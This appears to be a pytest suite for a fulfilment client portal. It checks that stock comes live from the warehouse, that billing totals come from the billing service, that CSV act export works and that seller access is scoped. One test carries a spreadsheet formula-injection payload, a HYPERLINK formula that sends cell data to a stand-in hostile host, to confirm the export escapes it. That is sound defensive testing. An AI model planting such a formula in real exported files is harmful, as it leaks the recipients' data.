"""ЛК клиента: одно число, потому что источник один.

Главная проверка здесь — что портал не заводит своего остатка. Сегодня он
показывает 3528 единиц при реальном остатке 92 именно потому, что зеркалит
кабинет Wildberries вместо склада (файл 04).
"""
from __future__ import annotations

import importlib
from typing import Any
from collections.abc import Iterator

import pytest
from starlette.testclient import TestClient

from app.db import Database
from app.upstream import Upstream


class FakeWms:
    def __init__(self) -> None:
        self.calls = 0
        self.rows = [
            {"barcode": "4600000000017", "good": 60, "reserved": 8, "available": 52},
            {"barcode": "4600000000024", "good": 32, "reserved": 0, "available": 32},
        ]
        self.down = False

    def stock(self, seller: str) -> list[dict[str, Any]]:
        if self.down:
            raise Upstream("склад недоступен (/warehouse/stock): connection refused")
        self.calls += 1
        return self.rows

    def placements(self, seller: str, barcode: str | None = None) -> list[dict[str, Any]]:
        return [{"box_barcode": "BOX-1", "cell": "01-02-03", "quantity": 42,
                 "comment": "куртки M, верхняя полка у окна"}]


class FakeBilling:
    def __init__(self) -> None:
        self.answer: tuple[int, Any] = (200, {"accruals": [
            {"occurred_on": "2026-09-10", "service": "packing", "quantity": "1.000",
             "unit_price": "30.00", "markup": "15.00", "amount": "45.00",
             "net_amount": "30.00", "partner_amount": "15.00", "partner_name": "Зардал"},
            {"occurred_on": "2026-09-10", "service": "shipping", "quantity": "1.000",
             "unit_price": "30.00", "markup": "15.00", "amount": "45.00",
             "net_amount": "30.00", "partner_amount": "15.00", "partner_name": "Зардал"},
        ]})
        # Итог считает БАЗА биллинга, а не портал: на полутора тысячах
        # операций страница кончалась на тысяче, и сумма по ней расходилась
        # и со счётом, и с админкой.
        self.summary: tuple[int, Any] = (200, {
            "period": "2026-09",
            "totals": {"amount": "90.00", "partner_amount": "30.00",
                       "net_amount": "60.00", "operations": 2},
            "invoice": None,
        })
        self.asked: list[tuple[str, dict[str, Any]]] = []

    def get(self, path: str, authorization: str | None,
            params: dict[str, Any] | None = None) -> tuple[int, Any]:
        self.asked.append((path, dict(params or {})))
        if path.endswith("/accruals/summary"):
            return self.summary
        return self.answer


class FakeIdentity:
    def __init__(self, principal: dict[str, Any] | None = None) -> None:
        self.principal = principal or {"active": True, "user_id": "u-owner",
                                       "roles": ["owner"], "sellers": ["stand-seller-001"]}

    def whoami(self, authorization: str | None) -> dict[str, Any]:
        return self.principal


@pytest.fixture
def parts(database: Database, monkeypatch: pytest.MonkeyPatch) -> Iterator[dict[str, Any]]:
    monkeypatch.setenv("APP_ENV", "test")
    monkeypatch.setenv("DATABASE_URL", database.url)
    from app import api as api_module

    importlib.reload(api_module)
    api_module.wms = FakeWms()
    api_module.billing = FakeBilling()
    api_module.identity = FakeIdentity()
    with database.transaction() as cursor:
        cursor.execute("TRUNCATE portal_export RESTART IDENTITY")
    with TestClient(api_module.app) as client:
        yield {"client": client, "wms": api_module.wms, "billing": api_module.billing,
               "module": api_module}


def test_the_stock_comes_from_the_warehouse_every_time(parts: dict[str, Any]) -> None:
    """Портал спрашивает склад при каждом показе и ничего не запоминает."""
    first = parts["client"].get("/api/portal/v1/stock").json()
    second = parts["client"].get("/api/portal/v1/stock").json()

    assert first["source"] == "wms"
    assert first["total_good"] == 92 and first["total_available"] == 84
    assert parts["wms"].calls == 2, "второй показ ответил из кэша — так и появляется 3528 против 92"
    assert second["total_good"] == first["total_good"]


def test_the_portal_keeps_no_stock_table_of_its_own(database: Database) -> None:
    """Зеркало, заведённое «для скорости», вернёт расхождение в тот же день."""
    with database.cursor() as cursor:
        cursor.execute("SELECT table_name FROM information_schema.tables "
                       " WHERE table_schema = 'public'")
        tables = {row["table_name"] for row in cursor.fetchall()}
    assert tables == {"portal_export", "schema_migrations"} or tables == {"portal_export"}, (
        f"в базе портала завелись таблицы {tables}: остаток хранить нельзя")


def test_when_the_warehouse_is_down_the_portal_refuses_instead_of_lying(
        parts: dict[str, Any]) -> None:
    """Показать вчерашнее число вместо отказа — это те же 3528, другим путём."""
    parts["wms"].down = True
    response = parts["client"].get("/api/portal/v1/stock")
    assert response.status_code == 502
    assert "склад недоступен" in response.json()["error"]


def test_the_client_sees_both_halves_of_the_price(parts: dict[str, Any]) -> None:
    """45 ₽ без разбивки читается как «MM-Express берёт 45»."""
    body = parts["client"].get("/api/portal/v1/accruals", params={"period": "2026-09"}).json()

    # Итог приезжает от биллинга, посчитанный базой, и НЕ складывается здесь.
    assert body["totals"] == {"amount": "90.00", "partner_amount": "30.00",
                              "net_amount": "60.00", "operations": 2}
    assert "наценку партнёра" in body["explanation"]
    assert body["accruals"][0]["partner_name"] == "Зардал"


def test_the_total_is_asked_for_and_not_added_up_here(parts: dict[str, Any]) -> None:
    """Портал не складывает начисления сам.

    На полутора тысячах операций страница заканчивалась на тысяче — молча, — и
    сумма по ней расходилась и со счётом, и с админкой. Спор «сколько я
    должен» решался тем, кто аккуратнее сложил.
    """
    billing = parts["billing"]
    # Страница короче, чем итог: ровно та сцена, ради которой итог считает база.
    billing.summary = (200, {"period": "2026-09",
                             "totals": {"amount": "67500.00", "partner_amount": "22500.00",
                                        "net_amount": "45000.00", "operations": 1500},
                             "invoice": {"number": "INV-2026-09-1", "state": "issued",
                                         "total_amount": "67500.00"}})

    body = parts["client"].get("/api/portal/v1/accruals", params={"period": "2026-09"}).json()

    assert body["totals"]["operations"] == 1500, (
        f"итог посчитан по странице ({body['totals']}), а не по периоду")
    assert body["totals"]["amount"] == "67500.00"
    assert body["invoice"]["number"] == "INV-2026-09-1", (
        "счёт за период не показан: клиенту не с чем сверить итог")
    assert any(path.endswith("/accruals/summary") for path, _ in billing.asked), (
        "портал не спросил итог у биллинга")


def test_a_partner_named_like_a_formula_does_not_execute_in_excel(
        parts: dict[str, Any]) -> None:
    """Акт клиента не должен быть исполняемым файлом.

    Значение, начинающееся с `=`, Excel считает формулой и выполняет при
    открытии. Имя партнёра приходит из онбординга — достаточно назвать его
    `=HYPERLINK(...)`, и акт клиента становится программой.
    """
    parts["billing"].answer = (200, {"accruals": [
        {"occurred_on": "2026-09-10", "service": "packing", "quantity": "1.000",
         "unit_price": "30.00", "markup": "15.00", "amount": "45.00",
         "net_amount": "30.00", "partner_amount": "15.00",
         "partner_name": '=HYPERLINK("http://зло/?s="&A1,"скидка")'},
    ]})

    response = parts["client"].get("/api/portal/v1/accruals.csv",
                                   params={"period": "2026-09"})
    text = response.content.decode("utf-8")

    assert ";=HYPERLINK" not in text, (
        "имя партнёра уехало в акт как формула: файл клиента исполняемый")
    assert "'=HYPERLINK" in text, "значение потерялось вовсе"


def test_the_act_is_downloaded_by_the_client_and_written_down(parts: dict[str, Any]) -> None:
    """Клиент выгружает акт сам, без участия бухгалтера (файл 04)."""
    response = parts["client"].get("/api/portal/v1/accruals.csv", params={"period": "2026-09"})

    assert response.status_code == 200
    assert "attachment" in response.headers["content-disposition"]
    text = response.content.decode("utf-8")
    assert "наценка партнёра" in text
    assert "итого;;2;;;90.00;60.00;30.00;" in text

    exports = parts["client"].get("/api/portal/v1/exports").json()["exports"]
    assert exports[0]["kind"] == "act" and exports[0]["rows_count"] == 2


def test_a_user_without_a_cabinet_is_told_why(parts: dict[str, Any]) -> None:
    """Пустой экран читается как «у вас ничего нет» и прячет причину."""
    parts["module"].identity = FakeIdentity(
        {"active": True, "user_id": "u-picker", "roles": ["picker"], "sellers": []})
    response = parts["client"].get("/api/portal/v1/stock")
    assert response.status_code == 403
    assert "нет кабинета" in response.json()["error"]


def test_the_cabinet_comes_from_the_role_not_from_the_query(parts: dict[str, Any]) -> None:
    """Иначе достаточно подставить чужой ключ продавца, чтобы увидеть чужой остаток."""
    body = parts["client"].get("/api/portal/v1/stock",
                               params={"seller_external_id": "stand-seller-099"}).json()
    assert body["seller_external_id"] == "stand-seller-001"


def test_the_screen_is_served(parts: dict[str, Any]) -> None:
    page = parts["client"].get("/")
    assert page.status_code == 200
    assert "личный кабинет" in page.text
